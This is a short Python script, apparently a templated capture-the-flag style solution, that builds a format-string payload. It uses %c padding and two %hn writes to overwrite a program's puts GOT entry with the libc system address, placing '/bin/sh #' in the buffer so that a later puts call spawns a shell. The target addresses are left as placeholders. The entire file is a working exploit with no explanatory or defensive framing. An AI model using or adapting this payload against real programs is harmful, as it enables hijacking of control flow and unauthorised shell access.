#!/usr/bin/env python3
import sys, struct

puts_got = {puts_got_slot}
system   = {libc_system_addr}
base     = 9      # got slot offset

lo = system & 0xffff
hi = (system >> 16) & 0xffff

cmd = b"/bin/sh #"      # 9 bytes
pad_align = b"A" * ((4 - (len(cmd) % 4)) % 4)   # 4-byte alignment

payload  = cmd + pad_align
payload += struct.pack("<I", puts_got)
payload += struct.pack("<I", puts_got + 2)

count = len(payload)

# lower 2 bytes
pad1 = (lo - count) % 0x10000
if pad1:
    payload += f"%{pad1}c".encode()
    count += pad1
payload += f"%{base}$hn".encode()

# higher 2 bytes
pad2 = (hi - count) % 0x10000
if pad2:
    payload += f"%{pad2}c".encode()
    count += pad2
payload += f"%{base+1}$hn".encode()

payload += b"\n"
sys.stdout.buffer.write(payload)
